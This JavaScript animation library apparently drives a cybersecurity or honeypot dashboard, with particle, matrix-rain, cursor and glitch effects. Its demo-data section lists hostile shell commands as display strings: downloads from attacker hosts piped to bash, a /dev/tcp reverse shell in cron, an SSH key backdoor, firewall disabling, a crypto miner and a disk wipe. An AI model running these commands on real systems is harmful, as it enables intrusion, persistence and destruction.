/*══════════════════════════════════════════════
  HARVEST-X — Animation Engine
  Stagger · Kinetic Typography · Micro-interactions
══════════════════════════════════════════════*/

(function () {
  'use strict';

  // ── Easing Curves ──
  const EASE = {
    outExpo: [0.19, 1, 0.22, 1],
    spring: [0.34, 1.56, 0.64, 1],
    smooth: [0.4, 0, 0.2, 1],
  };

  // ── STAGGER ──
  function stagger(selector, options = {}) {
    const els = document.querySelectorAll(selector);
    if (!els.length) return;

    const {
      from = 'opacity 0, transform: translateY(12px)',
      to = 'opacity: 1, transform: translateY(0)',
      delay = 80,
      initialDelay = 0,
      duration = 400,
    } = options;

    const fromProps = parseInline(from);
    const toProps = parseInline(to);

    els.forEach((el, i) => {
      Object.assign(el.style, fromProps);
      el.style.transition = `all ${duration}ms cubic-bezier(${EASE.outExpo.join(',')})`;
      el.style.transitionDelay = `${initialDelay + i * delay}ms`;
      requestAnimationFrame(() => {
        requestAnimationFrame(() => {
          Object.assign(el.style, toProps);
        });
      });
    });
  }

  function parseInline(str) {
    const obj = {};
    str.split(',').forEach(s => {
      const [key, val] = s.split(':').map(x => x.trim());
      if (key && val) obj[key] = val;
    });
    return obj;
  }

  // ── KINETIC TYPOGRAPHY ──
  function kineticText(el, text, options = {}) {
    const {
      speed = 40,
      stagger = 0,
      onComplete = null,
    } = options;

    if (!el) return;

    el.textContent = '';
    el.style.opacity = '1';

    const chars = text.split('');
    let charIndex = 0;

    function typeChar() {
      if (charIndex >= chars.length) {
        if (onComplete) onComplete();
        return;
      }
      el.textContent += chars[charIndex];
      charIndex++;
      setTimeout(typeChar, speed + Math.random() * speed * 0.5);
    }
    typeChar();
  }

  // ── KINETIC WORD REVEAL ──
  function kineticReveal(el, text, options = {}) {
    const {
      wordDelay = 120,
      duration = 350,
      onComplete = null,
    } = options;

    if (!el) return;

    const words = text.split(' ');
    el.innerHTML = words.map(() => '<span class="kinetic-word" style="display:inline-block;opacity:0;transform:translateY(20px) rotateX(40deg)">|</span> ').join('');
    const spans = el.querySelectorAll('.kinetic-word');

    spans.forEach((span, i) => {
      setTimeout(() => {
        span.textContent = words[i];
        span.style.transition = `all ${duration}ms cubic-bezier(${EASE.outExpo.join(',')})`;
        span.style.opacity = '1';
        span.style.transform = 'translateY(0) rotateX(0deg)';
      }, i * wordDelay);
    });

    if (onComplete) {
      setTimeout(onComplete, words.length * wordDelay + duration);
    }
  }

  // ── MICRO-INTERACTIONS ──
  function initMicroInteractions() {
    // Hover lift
    document.querySelectorAll('.hover-lift').forEach(el => {
      el.addEventListener('mouseenter', () => {
        el.style.transition = `transform 120ms cubic-bezier(${EASE.outExpo.join(',')})`;
        el.style.transform = 'translateY(-2px)';
      });
      el.addEventListener('mouseleave', () => {
        el.style.transform = 'translateY(0)';
      });
    });

    // Scale press
    document.querySelectorAll('.press-scale').forEach(el => {
      el.addEventListener('mousedown', () => {
        el.style.transition = `transform 100ms cubic-bezier(${EASE.outExpo.join(',')})`;
        el.style.transform = 'scale(0.96)';
      });
      el.addEventListener('mouseup', () => {
        el.style.transform = 'scale(1)';
      });
      el.addEventListener('mouseleave', () => {
        el.style.transform = 'scale(1)';
      });
    });

    // Glow follow
    document.querySelectorAll('.glow-follow').forEach(el => {
      el.addEventListener('mousemove', (e) => {
        const rect = el.getBoundingClientRect();
        const x = ((e.clientX - rect.left) / rect.width) * 100;
        const y = ((e.clientY - rect.top) / rect.height) * 100;
        el.style.setProperty('--glow-x', `${x}%`);
        el.style.setProperty('--glow-y', `${y}%`);
      });
    });
  }

  // ── COUNTING ANIMATION ──
  function animateCount(el, target, duration = 800, prefix = '', suffix = '') {
    if (!el) return;
    const start = performance.now();
    const initial = parseFloat(el.textContent.replace(/[,+%]/g, '')) || 0;

    function update(now) {
      const elapsed = now - start;
      const progress = Math.min(elapsed / duration, 1);
      // Cubic ease out
      const eased = 1 - Math.pow(1 - progress, 3);
      const current = Math.round(initial + (target - initial) * eased);
      el.textContent = prefix + current.toLocaleString() + suffix;
      if (progress < 1) requestAnimationFrame(update);
    }
    requestAnimationFrame(update);
  }

  // ── SCALE + OPACITY ENTRY ──
  function scaleIn(el, duration = 300, delay = 0) {
    if (!el) return;
    el.style.opacity = '0';
    el.style.transform = 'scale(0.92)';
    el.style.transition = `all ${duration}ms cubic-bezier(${EASE.outExpo.join(',')})`;
    el.style.transitionDelay = `${delay}ms`;
    requestAnimationFrame(() => {
      el.style.opacity = '1';
      el.style.transform = 'scale(1)';
    });
  }

  // ── SHARED ELEMENT TRANSITION ──
  function sharedTransition(fromEl, toUrl, options = {}) {
    const {
      duration = 350,
      color = '#00f0ff',
    } = options;

    if (!fromEl) {
      window.location.href = toUrl;
      return;
    }

    const rect = fromEl.getBoundingClientRect();
    const clone = fromEl.cloneNode(true);
    clone.style.position = 'fixed';
    clone.style.top = `${rect.top}px`;
    clone.style.left = `${rect.left}px`;
    clone.style.width = `${rect.width}px`;
    clone.style.height = `${rect.height}px`;
    clone.style.zIndex = '9999';
    clone.style.pointerEvents = 'none';
    clone.style.transition = `all ${duration}ms cubic-bezier(${EASE.outExpo.join(',')})`;
    clone.style.borderRadius = '12px';
    clone.style.overflow = 'hidden';
    document.body.appendChild(clone);

    requestAnimationFrame(() => {
      clone.style.top = '0';
      clone.style.left = '0';
      clone.style.width = '100vw';
      clone.style.height = '100vh';
      clone.style.borderRadius = '0';
      clone.style.boxShadow = `0 0 40px ${color}`;
    });

    setTimeout(() => {
      window.location.href = toUrl;
    }, duration);
  }

  // ── PARTICLE NETWORK ──
  class ParticleNetwork {
    constructor(canvas) {
      this.canvas = canvas;
      this.ctx = canvas.getContext('2d');
      this.particles = [];
      this.mouse = { x: 0, y: 0, radius: 120 };
      this.resize();
      this.init();
      this.animate();
      window.addEventListener('resize', () => this.resize());
      document.addEventListener('mousemove', (e) => {
        this.mouse.x = e.clientX;
        this.mouse.y = e.clientY;
      });
    }

    resize() {
      this.canvas.width = window.innerWidth;
      this.canvas.height = window.innerHeight;
      this.particleCount = Math.min(70, Math.floor((this.canvas.width * this.canvas.height) / 20000));
    }

    init() {
      this.particles = [];
      for (let i = 0; i < this.particleCount; i++) {
        this.particles.push({
          x: Math.random() * this.canvas.width,
          y: Math.random() * this.canvas.height,
          vx: (Math.random() - 0.5) * 0.3,
          vy: (Math.random() - 0.5) * 0.3,
          radius: Math.random() * 1.5 + 0.5,
          alpha: Math.random() * 0.35 + 0.05,
        });
      }
    }

    animate() {
      this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);
      const p = this.particles;

      for (let i = 0; i < p.length; i++) {
        p[i].x += p[i].vx;
        p[i].y += p[i].vy;

        if (p[i].x < 0 || p[i].x > this.canvas.width) p[i].vx *= -1;
        if (p[i].y < 0 || p[i].y > this.canvas.height) p[i].vy *= -1;

        this.ctx.beginPath();
        this.ctx.arc(p[i].x, p[i].y, p[i].radius, 0, Math.PI * 2);
        this.ctx.fillStyle = `rgba(0, 240, 255, ${p[i].alpha})`;
        this.ctx.fill();

        for (let j = i + 1; j < p.length; j++) {
          const dx = p[i].x - p[j].x;
          const dy = p[i].y - p[j].y;
          const dist = Math.sqrt(dx * dx + dy * dy);
          if (dist < 140) {
            const a = (1 - dist / 140) * 0.1;
            this.ctx.beginPath();
            this.ctx.moveTo(p[i].x, p[i].y);
            this.ctx.lineTo(p[j].x, p[j].y);
            this.ctx.strokeStyle = `rgba(0, 240, 255, ${a})`;
            this.ctx.lineWidth = 0.5;
            this.ctx.stroke();
          }
        }

        const mdx = p[i].x - this.mouse.x;
        const mdy = p[i].y - this.mouse.y;
        const mdist = Math.sqrt(mdx * mdx + mdy * mdy);
        if (mdist < this.mouse.radius) {
          const force = (this.mouse.radius - mdist) / this.mouse.radius;
          p[i].vx += (p[i].x - this.mouse.x) / mdist * force * 0.015;
          p[i].vy += (p[i].y - this.mouse.y) / mdist * force * 0.015;
        }
      }
      requestAnimationFrame(() => this.animate());
    }
  }

  // ── MATRIX RAIN ──
  class MatrixRain {
    constructor(canvas) {
      this.canvas = canvas;
      this.ctx = canvas.getContext('2d');
      this.charset = 'アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEF<>/{}[]|&^%$#@!';
      this.fontSize = 13;
      this.columns = 0;
      this.drops = [];
      this.resize();
      window.addEventListener('resize', () => this.resize());
    }

    resize() {
      this.canvas.width = window.innerWidth;
      this.canvas.height = window.innerHeight;
      this.columns = Math.floor(this.canvas.width / this.fontSize);
      this.drops = Array(this.columns).fill(1);
    }

    draw() {
      this.ctx.fillStyle = 'rgba(6, 10, 23, 0.04)';
      this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);
      this.ctx.font = `${this.fontSize}px monospace`;

      for (let i = 0; i < this.drops.length; i++) {
        const char = this.charset[Math.floor(Math.random() * this.charset.length)];
        const x = i * this.fontSize;
        const y = this.drops[i] * this.fontSize;
        this.ctx.fillStyle = Math.random() > 0.9 ? '#00ff88' : '#00f0ff';
        this.ctx.globalAlpha = 0.3;
        this.ctx.fillText(char, x, y);
        this.ctx.globalAlpha = 1;

        if (y > this.canvas.height && Math.random() > 0.975) {
          this.drops[i] = 0;
        }
        this.drops[i]++;
      }
    }

    start() {
      this.interval = setInterval(() => this.draw(), 45);
    }
    stop() {
      if (this.interval) clearInterval(this.interval);
    }
  }

  // ── GENERATE DEMO DATA ──
  const IPS = ['45.33.32.156', '104.236.76.42', '185.220.101.42', '91.121.87.35', '192.168.1.105', '103.235.46.90', '198.58.118.102', '176.31.107.38'];
  const CMDS = [
    'wget http://evil.com/payload.sh',
    'cat /etc/passwd',
    'uname -a',
    'cd /tmp && curl -O http://malware.local/kit',
    'echo "ssh-rsa AAAAB3..." >> ~/.ssh/authorized_keys',
    'chmod +x /tmp/payload && /tmp/payload',
    'nmap -sV -p 22,80,443 target.local',
    'python -c "import socket;s=socket.socket();s.connect((\'10.0.0.1\',4444));"',
    'wget -qO- http://c2-server.net/beacon | bash',
    'ls -la /root/.ssh/',
    'iptables -F',
    'killall -9 fail2ban',
    './minerd -o stratum+tcp://pool.minexmr.com:4444 -u 4A3b... -t 4',
    'echo "* * * * * /bin/bash -c \'sh -i >& /dev/tcp/10.0.0.5/8080 0>&1\'" | crontab -',
    'dd if=/dev/urandom of=/dev/sda bs=1M',
    'curl -s http://malware.pw/backdoor.py | python',
    'wget -O /tmp/bot http://c2.example.com/bot && chmod +x /tmp/bot && /tmp/bot',
    'echo "nameserver 8.8.8.8" > /etc/resolv.conf',
    'service iptables stop',
    '/usr/sbin/sshd -o PermitRootLogin=yes',
  ];

  function randIP() { return IPS[Math.floor(Math.random() * IPS.length)]; }
  function randCmd() { return CMDS[Math.floor(Math.random() * CMDS.length)]; }
  function randClass() {
    const r = Math.random();
    if (r < 0.15) return 'APT';
    if (r < 0.50) return 'Bot';
    if (r < 0.70) return 'Human';
    return 'Scanner';
  }
  function randRisk(cls) {
    if (cls === 'APT') return 70 + Math.floor(Math.random() * 30);
    if (cls === 'Human') return 30 + Math.floor(Math.random() * 40);
    if (cls === 'Bot') return 10 + Math.floor(Math.random() * 30);
    return Math.floor(Math.random() * 20);
  }

  function generateDemoSession() {
    const cls = randClass();
    return {
      src_ip: randIP(),
      classification: cls,
      risk_score: randRisk(cls),
      command: randCmd(),
      timestamp: new Date().toISOString(),
    };
  }

  // ── UTC TIME ──
  function nowUTC() {
    const n = new Date();
    return [n.getUTCHours(), n.getUTCMinutes(), n.getUTCSeconds()]
      .map(x => String(x).padStart(2, '0')).join(':');
  }

  // ── TOAST ──
  function showToast(msg, type = '') {
    let toast = document.getElementById('toast');
    if (!toast) {
      toast = document.createElement('div');
      toast.id = 'toast';
      toast.className = 'toast';
      toast.innerHTML = '<span class="toast-dot"></span><span id="toast-msg"></span>';
      document.body.appendChild(toast);
    }
    toast.className = 'toast ' + type;
    document.getElementById('toast-msg').textContent = msg;
    toast.classList.add('show');
    setTimeout(() => toast.classList.remove('show'), 3500);
  }

  // ── CUSTOM CURSOR ──
  function initCursor() {
    const style = document.createElement('style');
    style.textContent = `
      .nexus-cursor {
        position: fixed; pointer-events: none; z-index: 99999;
        width: 20px; height: 20px;
        border-radius: 50%;
        border: 1.5px solid rgba(255,106,0,0.4);
        background: rgba(255,106,0,0.03);
        transform: translate(-50%, -50%);
        transition: width 0.2s var(--ease-out-expo), height 0.2s var(--ease-out-expo), border-color 0.2s var(--ease-out-expo), background 0.2s var(--ease-out-expo);
        mix-blend-mode: screen;
        backdrop-filter: invert(0.05);
      }
      .nexus-cursor.trail {
        width: 6px; height: 6px;
        background: rgba(255,106,0,0.15);
        border: none;
        border-radius: 50%;
        position: fixed; pointer-events: none; z-index: 99998;
        mix-blend-mode: screen;
        transition: none;
      }
      .nexus-cursor.active {
        width: 40px; height: 40px;
        border-color: rgba(255,106,0,0.6);
        background: rgba(255,106,0,0.06);
      }
    `;
    document.head.appendChild(style);

    const cursor = document.createElement('div');
    cursor.className = 'nexus-cursor';
    document.body.appendChild(cursor);

    const trails = [];
    const trailCount = 12;
    for (let i = 0; i < trailCount; i++) {
      const t = document.createElement('div');
      t.className = 'nexus-cursor trail';
      t.style.opacity = 0.5 - (i / trailCount) * 0.45;
      t.style.width = `${6 - (i / trailCount) * 4}px`;
      t.style.height = t.style.width;
      document.body.appendChild(t);
      trails.push({ el: t, x: 0, y: 0 });
    }

    let mx = -100, my = -100;
    const positions = [];
    for (let i = 0; i < trailCount; i++) positions.push({ x: -100, y: -100 });

    document.addEventListener('mousemove', (e) => {
      mx = e.clientX;
      my = e.clientY;
      cursor.style.left = mx + 'px';
      cursor.style.top = my + 'px';

      positions.pop();
      positions.unshift({ x: mx, y: my });

      trails.forEach((t, i) => {
        const pos = positions[Math.min(i * 2, positions.length - 1)];
        t.el.style.left = pos.x + 'px';
        t.el.style.top = pos.y + 'px';
      });
    });

    document.addEventListener('mousedown', () => cursor.classList.add('active'));
    document.addEventListener('mouseup', () => cursor.classList.remove('active'));

    // Hide cursor on certain elements
    document.querySelectorAll('a, button, input, textarea, .no-cursor').forEach(el => {
      el.addEventListener('mouseenter', () => cursor.style.opacity = '0.3');
      el.addEventListener('mouseleave', () => cursor.style.opacity = '1');
    });

    // Remove default cursor on body
    document.body.style.cursor = 'none';

    return cursor;
  }

  // ── 3D CARD TILT ──
  function initCardTilt(selector = '.tilt-card') {
    document.querySelectorAll(selector).forEach(card => {
      card.addEventListener('mousemove', (e) => {
        const rect = card.getBoundingClientRect();
        const x = e.clientX - rect.left;
        const y = e.clientY - rect.top;
        const centerX = rect.width / 2;
        const centerY = rect.height / 2;
        const rotateX = ((y - centerY) / centerY) * -6;
        const rotateY = ((x - centerX) / centerX) * 6;
        card.style.transform = `perspective(800px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) translateY(-4px) scale(1.01)`;
        card.style.transition = 'transform 0.1s ease-out';
        card.style.setProperty('--glow-x', `${(x / rect.width) * 100}%`);
        card.style.setProperty('--glow-y', `${(y / rect.height) * 100}%`);
      });
      card.addEventListener('mouseleave', () => {
        card.style.transform = 'perspective(800px) rotateX(0deg) rotateY(0deg) translateY(0) scale(1)';
        card.style.transition = 'transform 0.5s cubic-bezier(0.19, 1, 0.22, 1)';
      });
    });
  }

  // ── SCREEN GLITCH ──
  function triggerGlitch(duration = 400, intensity = 1) {
    const overlay = document.createElement('div');
    overlay.style.cssText = `
      position: fixed; inset: 0; z-index: 99998;
      pointer-events: none;
      background: linear-gradient(0deg,
        rgba(255,23,68,${0.03 * intensity}) 0%,
        rgba(255,106,0,${0.03 * intensity}) 20%,
        rgba(255,23,68,${0.03 * intensity}) 40%,
        transparent 60%,
        rgba(255,106,0,${0.02 * intensity}) 80%,
        rgba(255,23,68,${0.03 * intensity}) 100%
      );
      mix-blend-mode: overlay;
      animation: glitch-overlay ${duration}ms steps(5) forwards;
    `;
    document.body.appendChild(overlay);

    // Skew and RGB split on body
    const html = document.documentElement;
    html.style.transition = 'none';
    html.style.transform = `skewX(${(Math.random() - 0.5) * 0.6 * intensity}deg)`;
    html.style.filter = `hue-rotate(${(Math.random() - 0.5) * 20 * intensity}deg)`;

    setTimeout(() => {
      html.style.transform = 'skewX(0deg)';
      html.style.filter = 'hue-rotate(0deg)';
      html.style.transition = 'all 0.3s ease';
    }, duration * 0.5);

    setTimeout(() => {
      if (overlay.parentNode) overlay.parentNode.removeChild(overlay);
    }, duration + 100);
  }

  // ── FLOATING HEX ELEMENTS ──
  function initFloatingHexes(containerId = 'body', count = 8) {
    const container = containerId === 'body' ? document.body : document.getElementById(containerId);
    if (!container) return;
    const fragment = document.createDocumentFragment();
    for (let i = 0; i < count; i++) {
      const hex = document.createElement('div');
      const size = 20 + Math.random() * 30;
      const x = Math.random() * 100;
      const y = Math.random() * 100;
      const dur = 8 + Math.random() * 12;
      const delay = Math.random() * 10;
      hex.style.cssText = `
        position: fixed; pointer-events: none; z-index: 0;
        left: ${x}%; top: ${y}%;
        width: ${size}px; height: ${size}px;
        border: 1px solid rgba(255,106,0,${0.03 + Math.random() * 0.04});
        background: rgba(255,106,0,${0.01 + Math.random() * 0.02});
        clip-path: polygon(50% 0%, 100% 25%, 100% 75%, 50% 100%, 0% 75%, 0% 25%);
        opacity: 0;
        animation: hex-float ${dur}s ${delay}s infinite;
      `;
      fragment.appendChild(hex);
    }
    container.appendChild(fragment);

    const style = document.createElement('style');
    style.textContent = `
      @keyframes hex-float {
        0% { opacity: 0; transform: translateY(0) rotate(0deg) scale(0.5); }
        10% { opacity: 1; }
        90% { opacity: 0.6; }
        100% { opacity: 0; transform: translateY(-120px) rotate(180deg) scale(1.2); }
      }
    `;
    document.head.appendChild(style);
  }

  // ── KINETIC SPRING TEXT (per character with bounce) ──
  function kineticSpring(el, text, options = {}) {
    const {
      charDelay = 30,
      duration = 400,
      onComplete = null,
    } = options;

    if (!el) return;
    el.innerHTML = '';
    el.style.opacity = '1';

    const chars = text.split('');
    chars.forEach((char, i) => {
      const span = document.createElement('span');
      span.textContent = char === ' ' ? '\u00A0' : char;
      span.style.cssText = `
        display: inline-block;
        opacity: 0;
        transform: translateY(30px) scale(0.5) rotateX(60deg);
        transition: all ${duration}ms cubic-bezier(0.34, 1.56, 0.64, 1);
        transition-delay: ${i * charDelay}ms;
      `;
      el.appendChild(span);
    });

    requestAnimationFrame(() => {
      requestAnimationFrame(() => {
        el.querySelectorAll('span').forEach(span => {
          span.style.opacity = '1';
          span.style.transform = 'translateY(0) scale(1) rotateX(0deg)';
        });
      });
    });

    if (onComplete) {
      setTimeout(onComplete, chars.length * charDelay + duration + 100);
    }
  }

  // ── INIT ──
  function initParticles(canvasId = 'particle-canvas') {
    const canvas = document.getElementById(canvasId);
    if (!canvas) return null;
    return new ParticleNetwork(canvas);
  }

  function initMatrix(canvasId = 'matrix-canvas') {
    const canvas = document.getElementById(canvasId);
    if (!canvas) return null;
    const rain = new MatrixRain(canvas);
    rain.start();
    return rain;
  }

  // ── EXPOSE ──
  window.Nexus = {
    stagger,
    kineticText,
    kineticReveal,
    animateCount,
    scaleIn,
    sharedTransition,
    initMicroInteractions,
    ParticleNetwork,
    MatrixRain,
    generateDemoSession,
    nowUTC,
    showToast,
    initParticles,
    initMatrix,
    initCursor,
    initCardTilt,
    triggerGlitch,
    initFloatingHexes,
    kineticSpring,
    randClass,
    randRisk,
    EASE,
    IPS,
    CMDS,
  };
})();
